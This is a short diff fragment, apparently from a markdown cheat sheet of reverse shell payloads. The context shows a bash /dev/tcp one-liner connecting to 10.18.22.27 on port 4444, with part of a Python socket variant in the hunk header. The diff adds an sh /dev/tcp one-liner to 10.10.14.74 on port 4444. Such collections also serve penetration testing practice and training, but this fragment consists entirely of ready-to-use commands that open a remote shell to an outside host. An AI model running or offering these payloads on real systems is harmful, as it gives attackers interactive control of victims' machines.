@@ -31,6 +31,7 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 
 ```bash
 bash -i >& /dev/tcp/10.18.22.27/4444 0>&1
+sh -i >& /dev/tcp/10.10.14.74/4444 0>&1
 ```
 
 ```js
